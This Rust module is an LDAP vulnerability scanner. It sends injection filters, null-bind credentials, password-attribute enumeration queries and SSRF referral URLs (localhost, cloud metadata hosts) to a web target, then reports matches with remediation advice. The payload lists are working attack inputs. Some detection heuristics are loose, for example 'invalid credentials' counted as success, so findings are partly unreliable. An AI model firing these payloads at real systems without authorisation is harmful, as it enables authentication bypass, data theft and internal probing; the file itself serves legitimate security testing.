//! LDAP (Lightweight Directory Access Protocol) Security Scanner
//!
//! Detects LDAP injection vulnerabilities and security misconfigurations:
//! - LDAP injection filters for authentication bypass
//! - Anonymous and NULL bind authentication issues
//! - Information disclosure via enumeration
//! - Referral abuse for SSRF
//! - Password hash exposure
//! - Privilege escalation via group membership
//!
//! SECURITY: This scanner tests LDAP services on ports 389 (LDAP) and 636 (LDAPS).
//! All tests are designed to identify vulnerabilities without causing service disruption.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::{Duration, Instant};

/// LDAP injection attack techniques
#[derive(Debug, Clone, PartialEq)]
pub enum LdapTechnique {
    /// Always-true filter bypass
    AlwaysTrue,
    /// Filter manipulation for auth bypass
    AuthBypass,
    /// OR injection for union queries
    OrInjection,
    /// AND injection for additional filters
    AndInjection,
    /// Parenthesis manipulation
    ParenthesisBypass,
    /// Comment-based bypass
    CommentBypass,
    /// Wildcard enumeration
    WildcardEnumeration,
    /// Anonymous bind
    AnonymousBind,
    /// NULL bind
    NullBind,
    /// Base DN disclosure
    BaseDnDisclosure,
    /// Naming context disclosure
    NamingContextDisclosure,
    /// Root DSE enumeration
    RootDseEnum,
    /// Schema enumeration
    SchemaEnum,
    /// User enumeration
    UserEnum,
    /// Group enumeration
    GroupEnum,
    /// Referral chasing for SSRF
    ReferralSsrf,
    /// Password hash exposure
    PasswordExposure,
    /// Password cracking via hash
    PasswordCracking,
    /// Account enumeration
    AccountEnum,
    /// Privilege escalation via group
    PrivilegeEscalation,
    /// Attribute enumeration
    AttributeEnum,
}

impl LdapTechnique {
    /// Get severity for this technique type
    pub fn severity(&self) -> VulnSeverity {
        match self {
            LdapTechnique::AlwaysTrue
            | LdapTechnique::AuthBypass
            | LdapTechnique::AnonymousBind
            | LdapTechnique::NullBind
            | LdapTechnique::PasswordExposure
            | LdapTechnique::PrivilegeEscalation => VulnSeverity::Critical,
            LdapTechnique::OrInjection
            | LdapTechnique::AndInjection
            | LdapTechnique::ParenthesisBypass
            | LdapTechnique::CommentBypass
            | LdapTechnique::ReferralSsrf
            | LdapTechnique::PasswordCracking => VulnSeverity::High,
            LdapTechnique::WildcardEnumeration
            | LdapTechnique::BaseDnDisclosure
            | LdapTechnique::NamingContextDisclosure
            | LdapTechnique::UserEnum
            | LdapTechnique::GroupEnum
            | LdapTechnique::AccountEnum => VulnSeverity::Medium,
            LdapTechnique::RootDseEnum
            | LdapTechnique::SchemaEnum
            | LdapTechnique::AttributeEnum => VulnSeverity::Low,
        }
    }

    /// Get description for this technique
    pub fn description(&self) -> &'static str {
        match self {
            LdapTechnique::AlwaysTrue => "LDAP injection with always-true filter for authentication bypass",
            LdapTechnique::AuthBypass => "LDAP authentication bypass via filter manipulation",
            LdapTechnique::OrInjection => "LDAP OR injection for filter bypass",
            LdapTechnique::AndInjection => "LDAP AND injection for additional filter injection",
            LdapTechnique::ParenthesisBypass => "Parenthesis manipulation for LDAP query bypass",
            LdapTechnique::CommentBypass => "Comment-based LDAP injection bypass",
            LdapTechnique::WildcardEnumeration => "Wildcard-based enumeration for data disclosure",
            LdapTechnique::AnonymousBind => "Anonymous bind (empty credentials) authentication bypass",
            LdapTechnique::NullBind => "NULL bind authentication attempt",
            LdapTechnique::BaseDnDisclosure => "Base DN disclosure via information leakage",
            LdapTechnique::NamingContextDisclosure => "Naming context disclosure for directory structure exposure",
            LdapTechnique::RootDseEnum => "Root DSE enumeration for server information disclosure",
            LdapTechnique::SchemaEnum => "Schema enumeration for attribute and object class disclosure",
            LdapTechnique::UserEnum => "User enumeration via LDAP queries",
            LdapTechnique::GroupEnum => "Group enumeration for privilege information disclosure",
            LdapTechnique::ReferralSsrf => "LDAP referral abuse for SSRF attacks",
            LdapTechnique::PasswordExposure => "Password hash exposure via LDAP attributes",
            LdapTechnique::PasswordCracking => "Password hash exposure for offline cracking",
            LdapTechnique::AccountEnum => "Account enumeration for user discovery",
            LdapTechnique::PrivilegeEscalation => "Privilege escalation via group membership manipulation",
            LdapTechnique::AttributeEnum => "Attribute enumeration for data structure disclosure",
        }
    }

    /// Get OWASP category
    pub fn owasp(&self) -> &'static str {
        match self {
            LdapTechnique::AlwaysTrue
            | LdapTechnique::AuthBypass
            | LdapTechnique::OrInjection
            | LdapTechnique::AndInjection
            | LdapTechnique::ParenthesisBypass
            | LdapTechnique::CommentBypass
            | LdapTechnique::AnonymousBind
            | LdapTechnique::NullBind => "A01:2021 - Broken Access Control",
            LdapTechnique::WildcardEnumeration
            | LdapTechnique::BaseDnDisclosure
            | LdapTechnique::NamingContextDisclosure
            | LdapTechnique::RootDseEnum
            | LdapTechnique::SchemaEnum
            | LdapTechnique::UserEnum
            | LdapTechnique::GroupEnum
            | LdapTechnique::AccountEnum
            | LdapTechnique::AttributeEnum => "A01:2021 - Broken Access Control",
            LdapTechnique::ReferralSsrf => "A10:2021 - Server-Side Request Forgery",
            LdapTechnique::PasswordExposure
            | LdapTechnique::PasswordCracking => "A02:2021 - Cryptographic Failures",
            LdapTechnique::PrivilegeEscalation => "A01:2021 - Broken Access Control",
        }
    }
}

/// LDAP injection payloads for authentication bypass
const AUTH_BYPASS_PAYLOADS: &[(&str, LdapTechnique)] = &[
    // Always-true filters
    ("(&(objectClass=*))", LdapTechnique::AlwaysTrue),
    ("(password=*)", LdapTechnique::AlwaysTrue),
    ("(|(objectClass=*)(userPassword=*))", LdapTechnique::AlwaysTrue),
    ("(&(objectClass=*)(!(objectClass=))))(userPassword=*", LdapTechnique::ParenthesisBypass),
    ("*)(&", LdapTechnique::AlwaysTrue),
    ("*)))%00", LdapTechnique::AlwaysTrue),
    ("(&(objectClass=*)(cn=*", LdapTechnique::WildcardEnumeration),
    ("(&(objectClass=*)(uid=*))", LdapTechnique::WildcardEnumeration),
    ("(&(objectClass=*)(sAMAccountName=*))", LdapTechnique::WildcardEnumeration),

    // Authentication bypass via OR injection
    ("(|(password=*)(userPassword=*))", LdapTechnique::OrInjection),
    ("(|(cn=*)(uid=*))", LdapTechnique::OrInjection),
    ("(|(userPassword=*)(unicodePwd=*))", LdapTechnique::OrInjection),

    // AND injection
    ("(&(cn=*)(objectClass=*))", LdapTechnique::AndInjection),
    ("(&(uid=admin)(|(objectClass=*)))", LdapTechnique::AndInjection),

    // Comment-based bypass
    ("(&(cn=admin)(!(cn=*))%00", LdapTechnique::CommentBypass),
    ("(&(cn=admin)%00", LdapTechnique::CommentBypass),
    ("(&(cn=admin)#)", LdapTechnique::CommentBypass),
    ("(&(cn=admin)/*)", LdapTechnique::CommentBypass),

    // Parenthesis manipulation
    ("(&(objectClass=user)(cn=*)(", LdapTechnique::ParenthesisBypass),
    ("))(|(objectClass=*))", LdapTechnique::ParenthesisBypass),
    ("*)(&(objectClass=*))(", LdapTechnique::ParenthesisBypass),

    // Null byte injection
    ("(&(cn=admin)\x00)", LdapTechnique::CommentBypass),
    ("(&(cn=admin)\x00(&(objectClass=*)))", LdapTechnique::CommentBypass),
];

/// Anonymous/NULL bind payloads
const AUTH_NULL_PAYLOADS: &[(&str, LdapTechnique)] = &[
    ("", LdapTechnique::AnonymousBind),
    (" ", LdapTechnique::AnonymousBind),
    ("\x00", LdapTechnique::NullBind),
    ("NULL", LdapTechnique::NullBind),
    ("anonymous", LdapTechnique::AnonymousBind),
    ("guest", LdapTechnique::AnonymousBind),
];

/// Enumeration payloads for information disclosure
const ENUM_PAYLOADS: &[(&str, LdapTechnique)] = &[
    // Root DSE - base disclosure
    ("(objectClass=*)", LdapTechnique::RootDseEnum),
    ("(objectClass=top)", LdapTechnique::RootDseEnum),
    ("(namingContexts=*)", LdapTechnique::NamingContextDisclosure),
    ("(defaultNamingContext=*)", LdapTechnique::BaseDnDisclosure),
    ("(schemaNamingContext=*)", LdapTechnique::SchemaEnum),

    // User enumeration
    ("(objectClass=user)", LdapTechnique::UserEnum),
    ("(objectClass=person)", LdapTechnique::UserEnum),
    ("(objectClass=inetOrgPerson)", LdapTechnique::UserEnum),
    ("(objectClass=organizationalPerson)", LdapTechnique::UserEnum),
    ("(cn=*)", LdapTechnique::UserEnum),
    ("(uid=*)", LdapTechnique::UserEnum),
    ("(sAMAccountName=*)", LdapTechnique::UserEnum),
    ("(userPrincipalName=*)", LdapTechnique::UserEnum),
    ("(mail=*)", LdapTechnique::UserEnum),
    ("(displayName=*)", LdapTechnique::UserEnum),

    // Group enumeration
    ("(objectClass=group)", LdapTechnique::GroupEnum),
    ("(objectClass=groupOfNames)", LdapTechnique::GroupEnum),
    ("(objectClass=groupOfUniqueNames)", LdapTechnique::GroupEnum),
    ("(cn=Domain Admins)", LdapTechnique::PrivilegeEscalation),
    ("(cn=Enterprise Admins)", LdapTechnique::PrivilegeEscalation),
    ("(cn=Administrators)", LdapTechnique::PrivilegeEscalation),
    ("(objectClass=posixGroup)", LdapTechnique::GroupEnum),

    // Attribute enumeration
    ("(userPassword=*)", LdapTechnique::PasswordExposure),
    ("(unicodePwd=*)", LdapTechnique::PasswordExposure),
    ("(pwdLastSet=*)", LdapTechnique::AttributeEnum),
    ("(memberOf=*)", LdapTechnique::AttributeEnum),
    ("(description=*)", LdapTechnique::AttributeEnum),
    ("(telephoneNumber=*)", LdapTechnique::AttributeEnum),
    ("(mobile=*)", LdapTechnique::AttributeEnum),
    ("(homeDirectory=*)", LdapTechnique::AttributeEnum),
    ("(loginShell=*)", LdapTechnique::AttributeEnum),

    // Account enumeration
    ("(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", LdapTechnique::AccountEnum),
    ("(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))", LdapTechnique::AccountEnum),
    ("(objectClass=computer)", LdapTechnique::AccountEnum),
    ("(objectClass=*)", LdapTechnique::WildcardEnumeration),

    // Password attribute exposure
    ("(|(userPassword=*)(unicodePwd=*)(clearTextPassword=*))", LdapTechnique::PasswordExposure),
    ("(userPassword=*)", LdapTechnique::PasswordCracking),
    ("(unicodePwd=*)", LdapTechnique::PasswordCracking),
];

/// Referral-based SSRF payloads
const REFERRAL_SSRF_PAYLOADS: &[(&str, LdapTechnique)] = &[
    ("ldap://localhost:389/", LdapTechnique::ReferralSsrf),
    ("ldap://127.0.0.1:389/", LdapTechnique::ReferralSsrf),
    ("ldaps://localhost:636/", LdapTechnique::ReferralSsrf),
    ("ldap://169.254.169.254/", LdapTechnique::ReferralSsrf),
    ("ldap://[::1]/", LdapTechnique::ReferralSsrf),
    ("ldap://localhost:11211/", LdapTechnique::ReferralSsrf),
    ("ldap://127.0.0.1:3306/", LdapTechnique::ReferralSsrf),
    ("ldap://127.1:389/", LdapTechnique::ReferralSsrf),
    ("ldap://0.0.0.0:389/", LdapTechnique::ReferralSsrf),
    ("ldap://metadata.google.internal/", LdapTechnique::ReferralSsrf),
];

/// Common LDAP parameter names
const LDAP_PARAMS: &[&str] = &[
    "user", "username", "uid", "cn", "dn", "distinguishedName",
    "password", "pass", "pwd", "userpassword", "unicodepwd",
    "query", "filter", "search", "searchfilter", "ldapfilter",
    "base", "basedn", "basedn", "dn", "distinguishedname",
    "attribute", "attributes", "attr", "attrs",
    "scope", "searchscope",
    "login", "auth", "authenticate", "bind", "binddn",
    "domain", "realm",
];

/// Response signatures indicating LDAP vulnerabilities
const LDAP_SUCCESS_SIGNATURES: &[&str] = &[
    // Successful auth bypass indicators
    "success", "authenticated", "login successful", "welcome",
    // LDAP error messages that indicate vulnerability
    "invalid credentials", "bind successful", "operation successful",
    // User enumeration responses
    "dn:", "distinguishedname:", "cn=", "uid=", "samaccountname=",
    // Data disclosure
    "objectclass=", "memberof=", "mail=", "displayname=",
    // Directory information
    "namingcontexts", "defaultnamingcontext", "schemanamingcontext",
    // Root DSE attributes
    "supportedldapversion", "supportedextension", "supportedcontrol",
    // Password attributes
    "userpassword:", "unicodepwd:", "pwdlastset:",
    // Group membership
    "memberof:", "memberof:=", "cn=domain admins", "cn=administrators",
    // Error messages revealing structure
    "no such object", "invalid syntax", "protocol error",
];

/// Common base DNs to test
const BASE_DNS: &[&str] = &[
    "dc=example,dc=com",
    "dc=domain,dc=local",
    "dc=corp,dc=com",
    "dc=local",
    "o=organization",
    "cn=users,dc=domain,dc=local",
    "cn=admins,dc=domain,dc=local",
    "ou=users,dc=domain,dc=local",
    "ou=people,dc=example,dc=com",
    "ou=groups,dc=example,dc=com",
];

pub struct LdapScanner {
    client: Client,
    config: ScannerConfig,
}

impl LdapScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(10);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(3))
            .build()
            .expect("Failed to create HTTP client for LDAP scanner");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Phase 1: Test LDAP injection in parameters
        report.merge(self.test_ldap_injection(url).await?);

        // Phase 2: Test authentication bypass
        report.merge(self.test_auth_bypass(url).await?);

        // Phase 3: Test information disclosure
        report.merge(self.test_info_disclosure(url).await?);

        // Phase 4: Test referral abuse (aggressive mode)
        if self.config.aggressive {
            report.merge(self.test_referral_ssrf(url).await?);
        }

        // Phase 5: Test enumeration (aggressive mode)
        if self.config.aggressive {
            report.merge(self.test_enumeration(url).await?);
        }

        // Phase 6: Test password exposure (aggressive mode)
        if self.config.aggressive {
            report.merge(self.test_password_exposure(url).await?);
        }

        Ok(report)
    }

    /// Test LDAP injection via parameter injection
    async fn test_ldap_injection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, technique) in AUTH_BYPASS_PAYLOADS.iter().take(15) {
            for param in LDAP_PARAMS.iter().take(10) {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
                };

                if let Some(vuln) = self.test_ldap_payload(&test_url, payload, technique).await? {
                    report.add_finding(vuln);
                    break;
                }
            }
        }

        Ok(report)
    }

    /// Test authentication bypass via NULL/anonymous bind
    async fn test_auth_bypass(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Test POST-based auth bypass
        for (username_payload, technique) in AUTH_NULL_PAYLOADS {
            for (password_payload, _pass_technique) in AUTH_NULL_PAYLOADS {
                let auth_data = [
                    ("username", *username_payload),
                    ("password", *password_payload),
                    ("user", *username_payload),
                    ("pass", *password_payload),
                    ("uid", *username_payload),
                    ("pwd", *password_payload),
                ];

                for (field, value) in auth_data {
                    let form_data = [(field, value)];
                    if let Ok(response) = self.client.post(url).form(&form_data).send().await {
                        if let Ok(text) = response.text().await {
                            if self.check_auth_bypass_response(&text) {
                                report.add_finding(Vuln {
                                    severity: technique.severity(),
                                    title: format!("LDAP Authentication Bypass: {}", technique.description()),
                                    description: format!(
                                        "Authentication bypass detected via {} injection. \
                                         The application accepted empty credentials for field '{}'.",
                                        technique.description(), field
                                    ),
                                    location: Some(format!("{} POST: {}={}", url, field, if value.is_empty() { "(empty)" } else { value })),
                                    recommendation: Some(
                                        "Implement proper authentication checks. Reject empty or NULL credentials. \
                                         Use secure bind with proper DN validation. Disable anonymous binds.".to_string()
                                    ),
                                    cwe: Some("CWE-287".to_string()),
                                    owasp: Some(technique.owasp().to_string()),
                                });
                                break;
                            }
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test information disclosure via enumeration queries
    async fn test_info_disclosure(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Test base DN disclosure
        for base_dn in BASE_DNS.iter().take(5) {
            for param in &["base", "dn", "basedn", "search"] {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(base_dn))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(base_dn))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if self.check_ldap_disclosure(&text) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: "LDAP Base DN Disclosure".to_string(),
                                description: format!(
                                    "Base DN information leaked. Server responded to query with: {}",
                                    if text.len() > 100 { &text[..100] } else { &text }
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Restrict LDAP query responses. Do not disclose directory structure. \
                                     Use least-privilege service accounts. Implement response filtering.".to_string()
                                ),
                                cwe: Some("CWE-200".to_string()),
                                owasp: Some("A01:2021 - Broken Access Control".to_string()),
                            });
                            break;
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test referral-based SSRF
    async fn test_referral_ssrf(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        for (payload, technique) in REFERRAL_SSRF_PAYLOADS {
            for param in LDAP_PARAMS.iter().take(5) {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
                };

                let start = Instant::now();
                if let Ok(response) = self.client.get(&test_url).send().await {
                    let duration = start.elapsed();

                    if let Ok(text) = response.text().await {
                        // Check for internal service responses or timing patterns
                        let text_lower = text.to_lowercase();
                        if text_lower.contains("localhost")
                            || text_lower.contains("127.0.0.1")
                            || text_lower.contains("ldap")
                            || text_lower.contains("referral")
                            || duration.as_millis() > 1000
                        {
                            report.add_finding(Vuln {
                                severity: technique.severity(),
                                title: format!("LDAP Referral SSRF: {}", technique.description()),
                                description: format!(
                                    "LDAP referral abuse for SSRF detected. \
                                     Server attempted to follow referral to: {} \
                                     Response time: {}ms",
                                    payload, duration.as_millis()
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Disable referral chasing or restrict to trusted domains only. \
                                     Validate all referral URLs. Implement network-level restrictions.".to_string()
                                ),
                                cwe: Some("CWE-918".to_string()),
                                owasp: Some(technique.owasp().to_string()),
                            });
                            break;
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test enumeration attacks
    async fn test_enumeration(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Test with wildcard enumeration payloads
        for (payload, technique) in ENUM_PAYLOADS.iter().take(15) {
            for param in &["filter", "query", "search", "ldapfilter"] {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if self.check_enumeration_response(&text, technique) {
                            report.add_finding(Vuln {
                                severity: technique.severity(),
                                title: format!("LDAP Enumeration: {}", technique.description()),
                                description: format!(
                                    "Information disclosure via LDAP enumeration. \
                                     Filter '{}' returned directory information.",
                                    payload
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Restrict query filters. Use least-privilege service accounts. \
                                     Implement result size limits. Log enumeration attempts.".to_string()
                                ),
                                cwe: Some("CWE-200".to_string()),
                                owasp: Some(technique.owasp().to_string()),
                            });
                            break;
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test password hash exposure
    async fn test_password_exposure(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        let password_payloads = &[
            "(userPassword=*)",
            "(unicodePwd=*)",
            "(clearTextPassword=*)",
            "(userPassword=*)",
            "(pwdLastSet=*)",
        ];

        for payload in password_payloads {
            for param in &["attributes", "attr", "attrs", "filter", "query"] {
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        let text_lower = text.to_lowercase();
                        // Check for password-related attributes in response
                        if text_lower.contains("userpassword")
                            || text_lower.contains("unicodepwd")
                            || text_lower.contains("cleartextpassword")
                            || text.contains("{SSHA}")
                            || text.contains("{SHA}")
                            || text.contains("{MD5}")
                            || text.contains("{CRYPT}")
                        {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Critical,
                                title: "LDAP Password Hash Exposure".to_string(),
                                description: format!(
                                    "Password hashes exposed via LDAP query. \
                                     Response may contain password hash data: {}",
                                    if text.len() > 100 { &text[..100] } else { &text }
                                ),
                                location: Some(test_url),
                                recommendation: Some(
                                    "Never return password attributes in queries. \
                                     Use attribute whitelist in LDAP queries. \
                                     Ensure passwords are properly hashed with salt.".to_string()
                                ),
                                cwe: Some("CWE-522".to_string()),
                                owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                            });
                            break;
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Test LDAP payload and return vulnerability if detected
    async fn test_ldap_payload(
        &self,
        test_url: &str,
        payload: &str,
        technique: &LdapTechnique,
    ) -> Result<Option<Vuln>> {
        let start = Instant::now();

        // Try GET request
        if let Ok(response) = self.client.get(test_url).send().await {
            if let Ok(text) = response.text().await {
                let duration = start.elapsed();

                if self.check_ldap_injection_response(&text, technique, duration) {
                    return Ok(Some(self.create_ldap_vuln(technique, test_url, &text, duration)));
                }
            }
        }

        // Try POST request with form data
        let form_data = [("filter", payload), ("query", payload), ("search", payload)];

        for (key, value) in form_data {
            if let Ok(response) = self.client.post(test_url).form(&[(key, value)]).send().await {
                if let Ok(text) = response.text().await {
                    let duration = start.elapsed();

                    if self.check_ldap_injection_response(&text, technique, duration) {
                        return Ok(Some(self.create_ldap_vuln(technique, test_url, &text, duration)));
                    }
                }
            }
        }

        Ok(None)
    }

    /// Check if response indicates successful LDAP injection
    fn check_ldap_injection_response(
        &self,
        text: &str,
        technique: &LdapTechnique,
        duration: Duration,
    ) -> bool {
        let text_lower = text.to_lowercase();

        // Check for success signatures
        for signature in LDAP_SUCCESS_SIGNATURES {
            if text_lower.contains(&signature.to_lowercase()) {
                return true;
            }
        }

        // Check for LDAP-specific indicators
        if text_lower.contains("dn:")
            || text_lower.contains("cn=")
            || text_lower.contains("uid=")
            || text_lower.contains("objectclass=")
        {
            return true;
        }

        // Check for authentication bypass success
        if matches!(technique, LdapTechnique::AlwaysTrue | LdapTechnique::AuthBypass) {
            if text_lower.contains("success")
                || text_lower.contains("authenticated")
                || text_lower.contains("welcome")
                || text_lower.contains("login")
            {
                return true;
            }
        }

        // Check for data disclosure
        if text_lower.contains("memberof:")
            || text_lower.contains("mail=")
            || text_lower.contains("displayname=")
        {
            return true;
        }

        // Timing-based detection for blind injection
        if duration.as_millis() > 2000 && text.len() < 100 {
            // Slow response with minimal content might indicate blind injection
            return true;
        }

        false
    }

    /// Check if response indicates authentication bypass
    fn check_auth_bypass_response(&self, text: &str) -> bool {
        let text_lower = text.to_lowercase();

        text_lower.contains("success")
            || text_lower.contains("authenticated")
            || text_lower.contains("welcome")
            || text_lower.contains("dashboard")
            || text_lower.contains("token")
            || text_lower.contains("session")
    }

    /// Check if response indicates LDAP information disclosure
    fn check_ldap_disclosure(&self, text: &str) -> bool {
        let text_lower = text.to_lowercase();

        text_lower.contains("namingcontext")
            || text_lower.contains("defaultnamingcontext")
            || text_lower.contains("schemanamingcontext")
            || text_lower.contains("dn:")
            || text_lower.contains("distinguishedname:")
    }

    /// Check if response indicates enumeration success
    fn check_enumeration_response(&self, text: &str, technique: &LdapTechnique) -> bool {
        let text_lower = text.to_lowercase();

        match technique {
            LdapTechnique::UserEnum => {
                text_lower.contains("uid=")
                    || text_lower.contains("cn=")
                    || text_lower.contains("samaccountname=")
                    || text_lower.contains("mail=")
            }
            LdapTechnique::GroupEnum => {
                text_lower.contains("memberof:")
                    || text_lower.contains("cn=domain")
                    || text_lower.contains("cn=administrators")
            }
            LdapTechnique::RootDseEnum => {
                text_lower.contains("supportedldapversion")
                    || text_lower.contains("supportedextension")
                    || text_lower.contains("namingcontext")
            }
            LdapTechnique::SchemaEnum => {
                text_lower.contains("attributetypes")
                    || text_lower.contains("objectclasses")
                    || text_lower.contains("schemanamingcontext")
            }
            LdapTechnique::AttributeEnum => {
                text_lower.contains("userpassword:")
                    || text_lower.contains("memberof:")
                    || text_lower.contains("displayname=")
            }
            _ => false,
        }
    }

    /// Create LDAP vulnerability finding
    fn create_ldap_vuln(
        &self,
        technique: &LdapTechnique,
        location: &str,
        response: &str,
        duration: Duration,
    ) -> Vuln {
        Vuln {
            severity: technique.severity(),
            title: format!("LDAP Injection: {}", technique.description()),
            description: format!(
                "{}{}",
                technique.description(),
                if duration.as_millis() > 1000 {
                    format!("\nResponse time: {}ms (may indicate blind LDAP injection)", duration.as_millis())
                } else if !response.is_empty() && response.len() < 200 {
                    format!("\nResponse: {}", response)
                } else {
                    String::new()
                }
            ),
            location: Some(location.to_string()),
            recommendation: Some(
                "Use parameterized LDAP queries. Validate and sanitize all user input. \
                 Implement proper input validation and allow-listing. \
                 Use least-privilege service accounts. Enable LDAP query logging.".to_string()
            ),
            cwe: Some("CWE-90".to_string()),
            owasp: Some(technique.owasp().to_string()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = LdapScanner::new(config);
        // Scanner created successfully
        assert!(true);
    }

    #[test]
    fn test_payloads_loaded() {
        assert!(!AUTH_BYPASS_PAYLOADS.is_empty());
        assert!(AUTH_BYPASS_PAYLOADS.len() > 10);

        assert!(!ENUM_PAYLOADS.is_empty());
        assert!(ENUM_PAYLOADS.len() > 20);

        assert!(!REFERRAL_SSRF_PAYLOADS.is_empty());
    }

    #[test]
    fn test_technique_severity() {
        assert_eq!(LdapTechnique::AlwaysTrue.severity(), VulnSeverity::Critical);
        assert_eq!(LdapTechnique::AuthBypass.severity(), VulnSeverity::Critical);
        assert_eq!(LdapTechnique::OrInjection.severity(), VulnSeverity::High);
        assert_eq!(LdapTechnique::UserEnum.severity(), VulnSeverity::Medium);
    }

    #[test]
    fn test_technique_owasp() {
        assert!(LdapTechnique::AlwaysTrue.owasp().contains("Access Control"));
        assert!(LdapTechnique::ReferralSsrf.owasp().contains("SSRF"));
        assert!(LdapTechnique::PasswordExposure.owasp().contains("Cryptographic"));
    }

    #[test]
    fn test_ldap_params() {
        assert!(LDAP_PARAMS.contains(&"user"));
        assert!(LDAP_PARAMS.contains(&"password"));
        assert!(LDAP_PARAMS.contains(&"filter"));
        assert!(LDAP_PARAMS.contains(&"base"));
    }

    #[test]
    fn test_base_dns() {
        assert!(BASE_DNS.contains(&"dc=example,dc=com"));
        assert!(BASE_DNS.contains(&"dc=domain,dc=local"));
        assert!(BASE_DNS.contains(&"ou=users,dc=domain,dc=local"));
    }

    #[test]
    fn test_auth_bypass_response() {
        let scanner = LdapScanner::new(ScannerConfig::new());

        assert!(scanner.check_auth_bypass_response("Login successful"));
        assert!(scanner.check_auth_bypass_response("Authenticated successfully"));
        assert!(scanner.check_auth_bypass_response("Welcome to dashboard"));
        assert!(!scanner.check_auth_bypass_response("Invalid credentials"));
    }

    #[test]
    fn test_ldap_disclosure() {
        let scanner = LdapScanner::new(ScannerConfig::new());

        assert!(scanner.check_ldap_disclosure("namingContexts: dc=example,dc=com"));
        assert!(scanner.check_ldap_disclosure("defaultNamingContext: DC=domain,DC=local"));
        assert!(scanner.check_ldap_disclosure("dn: cn=user,ou=users,dc=example,dc=com"));
        assert!(!scanner.check_ldap_disclosure("No results found"));
    }

    #[test]
    fn test_enumeration_user() {
        let scanner = LdapScanner::new(ScannerConfig::new());

        assert!(scanner.check_enumeration_response("uid=admin", &LdapTechnique::UserEnum));
        assert!(scanner.check_enumeration_response("cn=John Doe", &LdapTechnique::UserEnum));
        assert!(scanner.check_enumeration_response("mail=user@example.com", &LdapTechnique::UserEnum));
    }

    #[test]
    fn test_enumeration_group() {
        let scanner = LdapScanner::new(ScannerConfig::new());

        assert!(scanner.check_enumeration_response("memberOf: cn=admins", &LdapTechnique::GroupEnum));
        assert!(scanner.check_enumeration_response("cn=Domain Admins", &LdapTechnique::GroupEnum));
    }

    #[test]
    fn test_enumeration_root_dse() {
        let scanner = LdapScanner::new(ScannerConfig::new());

        assert!(scanner.check_enumeration_response("supportedLDAPVersion: 3", &LdapTechnique::RootDseEnum));
        assert!(scanner.check_enumeration_response("supportedExtension: 1.2.3", &LdapTechnique::RootDseEnum));
        assert!(scanner.check_enumeration_response("namingContexts: dc=example", &LdapTechnique::RootDseEnum));
    }
}
